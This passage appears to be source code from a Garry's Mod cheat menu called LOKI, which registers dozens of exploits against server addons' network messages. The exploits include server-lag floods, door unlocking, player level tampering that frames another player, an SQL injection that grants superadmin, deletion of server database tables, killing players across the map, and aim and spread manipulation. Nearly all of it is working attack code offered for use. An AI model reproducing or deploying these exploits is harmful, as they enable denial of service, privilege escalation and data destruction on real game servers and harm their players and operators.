    bools = {enabled = false},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("gamemode_reload_string") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "gamemode_reload_string")
            net.WriteString("GET ODIUM.PRO")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Use your toolgun. Very quickly",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("AS_DoAttack") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "AS_DoAttack")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Seems like a fault in the water purifier",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("lfs_player_request_filter") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "lfs_player_request_filter")
            net.WriteEntity(LOKI.GetLP())
            net.SendToServer()
        end,
        net = {
            Receive = function(sploit, strName)
                if(strName == "lfs_player_request_filter") then
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Hit the server with a killing spell",
    severity = 95,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = math.huge,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("hpwrewrite_achievement1") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "hpwrewrite_achievement1")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool" }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Hit the server with a drone strike",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("dronesrewrite") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit, function()
                net.WriteEntity(LOKI.GetLP())
            end)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"dronesrewrite_requestweapons", "dronesrewrite_addfriends", "dronesrewrite_makebind", "dronesrewrite_controldr", "dronesrewrite_addfriend", "dronesrewrite_addmodule", "dronesrewrite_clickkey", "dronesrewrite_presskey"} }
    },
} )
LOKI.AddExploit( "Lagsploit", {
    desc = "Administration fees might bankrupt the server",
    severity = 95,
    bools = {enabled = true},
    status = 1,
    msgs_per_tick = LOKI.GetEnabledCount,
    times_per_tick = math.huge,
    scan = function() return LOKI.DynamicNetString("ECleaner") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.MultiSend(sploit, function()
                net.WriteEntity(LOKI.GetLP())
            end)
        end,
    },
    functions = {
        { typ = "bools", tbl = {"ECleaner_ServerAction", "ECleaner_PlayEntity", "ECleaner_RestoreEntity"} }
    },
} )
LOKI.AddExploit( "Noise Exploit", {
    desc = "Causes players to become Lil Pump",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function() return #LOKI.GetStored( "lil_plyz", {} ) end,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "wanted_radio" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(LOKI.GetStored( "lil_plyz", {} )) do
                if IsValid(v) then
                    LOKI.NetStart(sploit, 'wanted_radio')
                    net.WriteEntity(v)
                    net.WriteInt(1, 4)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "lil_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Noise Exploit", {
    desc = "Causes players to become African",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function() return #LOKI.GetStored( "afro_plyz", {} ) end,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "lockpick_sound" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(LOKI.GetStored( "afro_plyz", {} )) do
                if IsValid(v) then
                    LOKI.NetStart(sploit, 'lockpick_sound')
                    net.WriteEntity(v)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "afro_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Door Exploit", {
    desc = "Exploit the door you're looking at",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString( "fp_as_doorHandler" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local v = LOKI.GetLP():GetEyeTrace().Entity
            local doorOwner = isfunction(v.getDoorData) && LOKI.ValidTable(v:getDoorData()) && v:getDoorData()["owner"] || nil
            LOKI.NetStart(sploit, "fp_as_doorHandler")
            net.WriteEntity(v)
            net.WriteString(tbl[1])
            if(doorOwner) then
                net.WriteDouble(doorOwner)
            end
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Lock", args = {"lock"} },
        { typ = "func", Name = "Unlock", args = {"unlock"} },
        { typ = "func", Name = "Remove Owner", args = {"removeOwner"} }
    },
} )
LOKI.AddExploit( "Door Exploit", {
    desc = "Unlock the door you're looking at",
    severity = 1,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString( "OpenGates" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local v = LOKI.GetLP():GetEyeTrace().Entity
            LOKI.NetStart(sploit, "OpenGates")
            net.WriteEntity(v)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Open" },
    },
} )
LOKI.AddExploit( "Door Exploit", {
    desc = "Unlock the door you're looking at",
    severity = 1,
    bools = {enabled = false},
    status = -1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString( "Kun_FinishLockpicking" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local v = LOKI.GetLP():GetEyeTrace().Entity
            LOKI.NetStart(sploit, "Kun_FinishLockpicking")
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Open" },
    },
} )
LOKI.AddExploit( "Door Exploit", {
    desc = "Unlock the door you're looking at",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString( "ReturnFrom_Succes" ) end,
    hooks = {
        Think = function(tbl, sploit)
            local v = LOKI.GetLP():GetEyeTrace().Entity
            LOKI.NetStart(sploit, "ReturnFrom_Succes")
            net.WriteEntity(v)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Open" },
    },
} )
LOKI.AddExploit( "Door Exploit", {
    desc = "Unlock and open every door as you walk up to it (blatant)",
    severity = 1,
    bools = {enabled = false},
    vars = {object = Entity(0)},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString( "dialogAlterWeapons" ) end,
    hooks = {
        Tick = function(tbl, sploit)
            for k, object in pairs( ents.FindInSphere( LOKI.GetLP():GetPos(), 150 ) ) do
                if(object == LOKI.GetLP():GetEyeTrace().Entity && object:GetClass():find("door") && object != sploit.vars.object) then
                    LOKI.NetStart(sploit, "dialogAlterWeapons", true)
                    net.WriteString("Add")
                    net.WriteTable({[1] = "ci_hacking_gear"})
                    net.SendToServer()
                    sploit.vars.object = object
                    break
                end
            end
        end,
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Unbox Exploit", {
    desc = "Choose what you get from an unbox",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString( "InitSpin" ) end,
    hooks = {
        net = {
            Receive = function(sploit, strName)
                if(strName == "InitSpin" && sploit.bools.enabled) then
                    local data = net.ReadTable()
                    local added = {}
                    local m = DermaMenu()
                    for k, v in ipairs(data) do
                        local CRC = util.CRC(table.ToString(v))
                        if(v.itemName && !added[CRC]) then
                            added[CRC] = CRC
                            m:AddOption( v.itemName .. (v.itemClassName != nil && " (" .. v.itemClassName .. ")" || ""), function() 
                                LOKI.NetStart(sploit, "FinishedUnbox") 
                                net.WriteInt(k, 16) 
                                net.SendToServer() 
                            end )
                        end
                    end
                    m:Open()
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", Name = "Open" },
    },
} )
LOKI.AddExploit( "Noise Exploit", {
    desc = "Causes players to leak petrol from their eyes",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    msgs_per_tick = function() return #LOKI.GetStored( "gas_plyz", {} ) end,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "simfphys_gasspill" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(LOKI.GetStored( "gas_plyz", {} )) do
                if IsValid(v) then
                    LOKI.NetStart( sploit, "simfphys_gasspill" )
                    net.WriteVector( v:GetEyeTrace().HitPos )
                    net.WriteVector( v:GetEyeTrace().HitNormal )
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "gas_plyz" },
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Level Exploit", {
    desc = "Set players level to anything (and blame someone else for admin abuse)",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString( "EL_editUser" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs(LOKI.GetStored( "level1_targets", {LOKI.GetLP()} )) do
                if(IsValid(v)) then
                    LOKI.NetStart( sploit, "EL_editUser")
                    DATA = {
                        Target = v,
                        Value = LOKI.GetStored("level1_level", 100), 
                        Value2 = LOKI.GetStored("level1_xp", 100), 
                        Value3 = LOKI.GetStored("level1_sp", 100),
                        Value4 = LOKI.GetStored("level1_rank", 1)[2],
                        Executer = LOKI.GetStored("level1_victim", {})[1],
                    }
                    net.WriteTable(DATA)
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "level1_targets", Name = "Target" },
        { typ = "float", addr = "level1_level", Name = "Level", min = 0, max = math.huge, default = 100 },
        { typ = "float", addr = "level1_xp", Name = "Exp", min = 0, max = math.huge, default = 100 },
        { typ = "float", addr = "level1_sp", Name = "Skill Points", min = 0, max = math.huge, default = 1200 },
        { typ = (EL_Ranks && "combo" || "float"), tbl = EL_Ranks || {}, Name = "Rank", default = {"", 1}, addr = "level1_rank", min = 0, max = math.huge, default = 1, var = "name", sort = "rank", find = "rank" },
        { typ = "player", addr = "level1_victim", Name = "Victim" },
        { typ = "func", Name = "Do it"},
    },
} )
LOKI.AddExploit( "Level Exploit", {
    desc = "Manipulate any players level and inventory",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") != false || LOKI.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") != false end,
    count = {
        ["Active"] = 0,
        ["Total"] = 2,
    },
    initial = function(sploit)
        if(isfunction(LOKI.RecursiveGetVar(CRAFTINGMOD, {"Util", "CheckAdmin"}, "function"))) then
            function CRAFTINGMOD.Util:CheckAdmin() return true end
        end
        local meta = debug.getregistry().Player
        if(isfunction(meta.IsAdmin)) then
            function meta:IsAdmin() return true end
        end
        if(sploit.count.Active == 0) then
            if(LOKI.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") != false) then
                sploit.count.Active = sploit.count.Active + 1
            end
            if(LOKI.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") != false) then
                sploit.count.Active = sploit.count.Active + 1
            end
        end
    end,
    hooks = {
        Think = function(tbl, sploit)
            if(tbl[1] == 1) then
                local menu = LOKI.RecursiveGetVar(CRAFTINGMOD, {"PANELS", "AdminMenu"}, "function")
                if(isfunction(menu)) then
                    menu(CRAFTINGMOD.PANELS)
                    LOKI.Menu:SetVisible(false)
                end
            elseif(tbl[1] == 2) then
                local menu = LOKI.RecursiveGetVar(FARMINGMOD, {"AdminMenu"}, "function")
                if(isfunction(menu)) then
                    menu(FARMINGMOD)
                    LOKI.Menu:SetVisible(false)
                end
            end
        end,
    },
    functions = {
        { typ = "func", Name = "Admin Menu (Mining)", args = {1}, required = LOKI.RecursiveGetVar(_G, {"CRAFTINGMOD"}, "table") != false},
        { typ = "func", Name = "Admin Menu (Farming)", args = {2}, required = LOKI.RecursiveGetVar(_G, {"FARMINGMOD"}, "table") != false},
    },
} )
LOKI.AddExploit( "Level Exploit", {
    desc = "Wield the Infinity Gauntlet",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return istable(DarkRPG) end,
    count = {
        ["Active"] = 22,
        ["Total"] = 22,
    },
    hooks = {
        Think = function(tbl, sploit)
            LOKI.OpenTableEditor(LOKI.Menu, DarkRPG.Player.Stats, "Player Stat Multipliers", function(tbl)
                local DarkRPG = LOKI.GetUpValues(DarkRPG.createTalent)["menu"] || DarkRPG
                DarkRPG.savePlayerSettings()
                DarkRPG.updateTalentTree()
                DarkRPG.applyPlayerSettings()
                DarkRPG.updateUsedPoints()
                DarkRPG.sendPlayerTotalsToServer()
            end)
        end,
    },
    functions = {
        { typ = "func", Name = "Close Fist", },
    },
} )
LOKI.AddExploit( "Database Exploit", {
    desc = "Give people superadmin (rejoin for it to take effect)",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    prevalidated = true,
    scan = function() return LOKI.ValidNetString( "pplay_sendtable", "pplay_deleterow" ) && cl_PPlay end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "l_superadmins", {} ) ) do
                if !IsValid(v) then continue end
                local ass = {}
                ass.tblname = "FAdmin_PlayerGroup; UPDATE FAdmin_PlayerGroup SET groupname = 'superadmin' WHERE steamid = " .. sql.SQLStr(v:SteamID())
                ass.ply = v
            
                LOKI.NetStart(sploit, "pplay_sendtable")
                net.WriteTable(ass)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "players", addr = "l_superadmins" },
        { typ = "func", Name = "Gibsmedat", },
    },
} )
LOKI.AddExploit( "Database Exploit", {
    desc = "Clumsy transport men always dropping the tables",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString("CRAFTINGMOD_COMMANDS") || LOKI.ValidNetString("FISHINGMOD_ADMIN") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, (LOKI.ValidNetString("CRAFTINGMOD_COMMANDS") && "CRAFTINGMOD_COMMANDS") || (LOKI.ValidNetString("FISHINGMOD_ADMIN") && "FISHINGMOD_ADMIN"))
            net.WriteInt(3, 16)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "func", Name = "Do it"},
    },
} )
LOKI.AddExploit( "Database Exploit", {
    desc = "Permanently delete all money printers from the server database",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return istable(gPrinters) && LOKI.ValidNetString("gPrinters.removePrinter") end,
    hooks = {
        Think = function(tbl, sploit)
            for _, printer in pairs( gPrinters.printers or {} ) do
                for k, v in pairs( gPrinters.printers[ "Printers" ][ printer ] or printer ) do
                    LOKI.NetStart(sploit, "gPrinters.removePrinter" )
                        net.WriteString( v.uid )
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "func", Name = "Do it"},
    },
} )
LOKI.AddExploit( "Damage Exploit", {
    desc = "Makes your bullets more accurate and more lethal",
    severity = 1,
    bools = {enabled = true},
    status = 1,
    times_per_tick = 1,
    scan = function(sploit) if(istable(LeyHitreg)) then sploit.channel = LOKI.GetUpValues(LeyHitreg.EntityFireBullets)["option_customnetmsg"] return true end end,
    count = {
        ["Active"] = 5,
        ["Total"] = 5,
    },
    channel = "nocheatinghere",
    hooks = {
        net = {
            SendToServer = function(sploit, varargs)
                sploit.BulletData = nil
            end,
        },
        util = {
            TraceLine = function(sploit, varargs)
                if(LOKI.NetOutgoingMsg == sploit.channel) then
                    local trace = util.TraceLine(unpack(varargs))
                    if(sploit.bools.bighead) then
                        trace.HitGroup = HITGROUP_HEAD
                    end
                    if(sploit.bools.magicbullet && (!trace.Entity || !IsValid(trace.Entity) || !trace.Entity:IsPlayer())) then
                        local ply = LOKI.GetLP()
                        for k, ent in ipairs(player.GetAll()) do
                            if(ent == ply || ent:Health() <= 0) then continue end
                            local mins, maxs = (ent:OBBMins()*LOKI.GetStored("dmg1_hbox", 2)), (ent:OBBMaxs()*LOKI.GetStored("dmg1_hbox", 2))
                            mins = mins - (Vector(0,0,math.abs(maxs.z/2))) + ent:OBBCenter()
                            maxs = maxs - (Vector(0,0,math.abs(maxs.z/2))) + ent:OBBCenter()
                            local hitpos, normal, fraction = util.IntersectRayWithOBB(LOKI.Freecam.EyePos(), ply:GetAimVector() * 16384, ent:GetPos(), Angle(0,0,0), mins, maxs, 2)
                            if (hitpos) then
                                trace.Entity = ent
                                trace.HitPos = hitpos
                                
                                debugoverlay.Line(trace.StartPos, trace.HitPos, 5, color_white, true)
                                debugoverlay.BoxAngles(ent:GetPos(), mins, maxs, ent:GetAngles(), 5, color_white)
                                break
                            end
                        end
                    end
                    if(sploit.BulletData && varargs[1].start == sploit.BulletData.Src && sploit.bools.desync) then
                        local pos = Vector(0,0,0)
                        if(LOKI.Freecam.Enabled) then
                            pos = LOKI.Freecam.EyePos()
                        elseif(IsValid(trace.Entity)) then
                            local dist = math.Round(trace.HitPos:DistToSqr(LOKI.GetLP():GetShootPos()))
                            if(math.abs(dist) < (600*600)) then
                                pos = trace.Entity:GetPos() + trace.Entity:OBBCenter()
                            else
                                for k, v in ipairs(ents.FindInSphere(LOKI.GetLP():GetShootPos(), 600)) do
                                    if(v == LOKI.GetLP()) then continue end
                                    if(IsValid(v:GetPhysicsObject()) && math.abs(math.Round((v:GetPos() + v:OBBCenter()):DistToSqr(LOKI.GetLP():GetShootPos()))) < (600*600)) then
                                        pos = v:GetPos() + v:OBBCenter()
                                        break
                                    end
                                end
                            end
                        end
                        varargs[1].endpos = varargs[1].endpos - varargs[1].start
                        varargs[1].start.x = pos.x
                        varargs[1].start.y = pos.y
                        varargs[1].start.z = pos.z
                        varargs[1].endpos = varargs[1].endpos + varargs[1].start
                    end
                    return trace
                end
            end,
        },
        math = {
            random = function(sploit, varargs)
                if(sploit.bools.nospread && LOKI.NetOutgoingMsg == sploit.channel) then
                    return 0.5
                end
            end,
        },
        table = {
            Copy = function(sploit, varargs)
                local function func(index)
                    local dbginfo = debug.getinfo(index)
                    if(istable(dbginfo) && dbginfo.func == LeyHitreg.EntityFireBullets) then
                        LOKI.NetOutgoingMsg = sploit.channel
                        sploit.BulletData = varargs[1]
                        return true
                    end
                end
                if(!func(3)) then func(4) end
            end,
        },
        PostRender = function(tbl, sploit)
            if(LOKI.Freecam.Enabled == true && sploit.bools.desync) then
                local dist = math.Round(EyePos():DistToSqr(LOKI.GetLP():GetShootPos()))
                local color = Color(255,255,255)
                if(math.abs(dist) > (600*600)) then
                    color = Color(255, 0, 0)
                else
                    color = Color(102, 255, 102)
                end
                LOKI.DrawText( dist, "TargetID", 0, 20, color )
            end
        end,
    },
    functions = {
        { typ = "bool", ToggleText = {"Damage"}, border = true, bool = "bighead" },
        { typ = "bool", ToggleText = {"NoSpread"}, border = true, bool = "nospread" },
        { typ = "bool", ToggleText = {"Desync"}, border = true, bool = "desync" },
        { typ = "bool", ToggleText = {"Assist"}, border = true, bool = "magicbullet" },
        { typ = "float", Name = "Hitbox Scale", min = 1, max = math.huge, default = 1.5, addr = "dmg1_hbox" },
        //{ typ = "bool" },
    },
} )
LOKI.AddExploit( "Damage Exploit", {
    desc = "Be a silent assassin by injuring people across the map",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString("Taucannonfire") end,
    hooks = {
        Think = function(tbl, sploit)
            for i = 0, LOKI.GetStored("dmg1_mult", 1) do
                for k, v in ipairs( LOKI.GetStored( "dmg1_plyz", {} ) ) do
                    if IsValid(v) then
                        if(v:IsPlayer()) then
                            LOKI.NetStart(sploit, "Taucannonfire")
                            net.WriteEntity(v)
                            net.WriteBit(1)
                            net.SendToServer()
                        end
                    end
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "dmg1_plyz", Name = "Victims" },
        { typ = "float", Name = "Multiplier", min = 1, max = math.huge, default = 1, addr = "dmg1_mult" },
        { typ = "func", Name = "Do it"},
    },
} )
LOKI.AddExploit( "Damage Exploit", {
    desc = "Be a silent assassin by killing people across the map",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString("mat_zset") end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "dmg2_plyz", {} ) ) do
                if IsValid(v) then
                    LOKI.NetStart(sploit, "mat_zset")
                    net.WriteString(v:Nick())
                    net.SendToServer()
                end
            end
        end,
    },
    functions = {
        { typ = "players", addr = "dmg2_plyz", Name = "Victims" },
        { typ = "func", Name = "Do it"},
    },
} )
LOKI.AddExploit( "Damage Exploit", {
    desc = "Become a god among men",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString("dialogClose", "f4menufreeze") end,
    OnDisable = function(var, sploit)
        LOKI.NetStart( sploit, "dialogClose")
        net.SendToServer()
    end,
    hooks = {
        net = {
            Start = function(sploit, varargs)
                if(varargs[1] == "dialogClose" && sploit.bools.enabled) then
                    LOKI.NetStart(sploit, "f4menufreeze")
                    net.WriteBool(false)
                    net.SendToServer()
                    LOKI.GetLP().dialogActive = false
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Damage Exploit", {
    desc = "Become the human torch",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    prevalidated = true,
    scan = function() return LOKI.ValidNetString("DragonVapeIgnite") && LOKI.GetLP():HasWeapon("weapon_vape_dragon") end,
    scan_always = true,
    hooks = {
        Tick = function(tbl, sploit)
            for k, v in ipairs(ents.GetAll()) do
                if(!IsValid(v) || !v:IsSolid() || v:GetPos():Distance(LOKI.GetLP():GetPos()) > 500) then continue end
                LOKI.NetStart(sploit, "DragonVapeIgnite")
                net.WriteEntity(v)
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Damage Exploit", {
    desc = "Evolve into a human with gills",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return LOKI.ValidNetString("StaminaDrowning") end,
    hooks = {
        net = {
            Start = function(sploit, varargs)
                if(varargs[1] == "StaminaDrowning" && sploit.bools.enabled) then
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool" },
    },
} )
LOKI.AddExploit( "Damage Exploit", {
    desc = "Makes your bullets more lethal",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function(sploit) return LOKI.ValidNetString("shr") end,
    hooks = {
        net = {
            WriteUInt = function(sploit, varargs)
                if(LOKI.NetOutgoingMsg == "shr" && istable(LOKI.NetOutgoingData[6]) && LOKI.NetOutgoingData[6].Type == "Vector" && sploit.bools.enabled) then
                    varargs[1] = HITGROUP_HEAD
                end
            end,
        },
    },
    functions = {
        { typ = "bool" },
    },
} ) -- not done and not worth working on since it only exists on ~5 servers total
LOKI.AddExploit( "Teleport Exploit", {
    desc = "Call a taxi",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    scan = function() return isfunction(net.Receivers["taxi_menu"]) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.Menu:SetVisible(false)
            net.Receivers["taxi_menu"]()
        end,
    },
    functions = {
        { typ = "func", Name = "Open", args = {1}},
    },
} )
LOKI.AddExploit( "Instant Dumpster Diving", {
    desc = "Loot dumpsters whilst smoking crack",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "dumpster_beginsearch" ) end,
    hooks = {
        net = {
            Receive = function(sploit, strName)
                if(strName == "dumpster_beginsearch") then
                    net.Receivers["dumpster_beginsearch"]()
                    if(sploit.bools.enabled) then
                        LOKI.GetLP().DumpsterTime = 0
                        LOKI.GetLP().DumpsterDiving = false
                        LOKI.NetStart(sploit, "dumpster_search_complete", true)
                        net.WriteInt(LOKI.GetLP().ActiveDumpster, 32)
                        net.SendToServer()
                    end
                    return false
                end
            end,
        },
    },
    functions = {
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Disguise Exploit", {
    desc = "Disguise as any job",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "disguise" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "disguise" )
            net.WriteInt(LOKI.SafeToNumber(LOKI.GetStored("disguise1", {1, 1})[2]), 32)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "combo", Name = "Job", tbl = team.GetAllTeams(), restriction = "Joinable", var = "Name", sort = "Name", default = 1, addr = "disguise1" },
        { typ = "func", Name = "Disguise", },
    },
} ) 
LOKI.AddExploit( "Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return (LOKI.ValidNetString( "gportal_rpname_change" ) && "gportal_rpname_change") || (LOKI.ValidNetString( "gp_rpname_change" ) && "gp_rpname_change") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, sploit.channel)
            net.WriteString(tostring(LOKI.GetStored( "nc1" )))
            net.WriteString(tostring(LOKI.GetStored( "nc2" )))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "First Name:", default = "GET", addr = "nc1" },
        { typ = "string", Name = "Last Name:", default = "ODIUM.PRO", addr = "nc2" },
        { typ = "func", Name = "Change Name", }
    },
} ) 
LOKI.AddExploit( "Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "WS:NPC:Name:NewName" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "WS:NPC:Name:NewName")
            net.WriteString(tostring(LOKI.GetStored( "nc2" )))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Name: ", default = "GET ODIUM.PRO", addr = "nc2" },
        { typ = "func", Name = "Change Name", }
    },
} )
LOKI.AddExploit( "Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "NewRPNameSQL" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "NewRPNameSQL")
            net.WriteString(tostring(LOKI.GetStored( "nc3" )))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Name: ", default = "GET ODIUM.PRO", addr = "nc3" },
        { typ = "func", Name = "Change Name", }
    },
} )
LOKI.AddExploit( "Name Changer", {
    desc = "Allows you to change your steam name to anything. (32 char limit)",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return isfunction(CNetChan) && CNetChan() && CNetChan():GetReliableBuffer() end,
    hooks = {
        Think = function(tbl, sploit)
            local buffer = CNetChan():GetReliableBuffer()
            buffer:WriteUInt(net_SetConVar, NET_MESSAGE_BITS)
            buffer:WriteByte(1)
            buffer:WriteString("name")
            buffer:WriteString(tostring(LOKI.GetStored( "nc4" )))
        end,
    },
    functions = {
        { typ = "string", Name = "Name: ", default = "GET ODIUM.PRO", addr = "nc4" },
        { typ = "func", Name = "Change Name", }
    },
} )
LOKI.AddExploit( "Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "rpname_change" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "rpname_change")
            net.WriteString(tostring(LOKI.GetStored( "nc5" )))
            net.WriteString(tostring(LOKI.GetStored( "nc51" )))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "First Name:", default = "GET", addr = "nc5" },
        { typ = "string", Name = "Last Name:", default = "ODIUM.PRO", addr = "nc51" },
        { typ = "func", Name = "Change Name", }
    },
} )
LOKI.AddExploit( "Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "popupinfo" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "popupinfo")
            net.WriteString(tostring(LOKI.GetStored( "nc6" )))
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "string", Name = "Name:", default = "GET ODIUM.PRO", addr = "nc6" },
        { typ = "func", Name = "Change Name", }
    },
} )
LOKI.AddExploit( "Name Changer", {
    desc = "Allows you to change your name to anything",
    severity = 1,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "scoreboardadmin" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "scoreboardadmin")
            net.WriteEntity( LOKI.GetLP() )
            net.WriteString( "rpname" )
            net.WriteString( "user" )
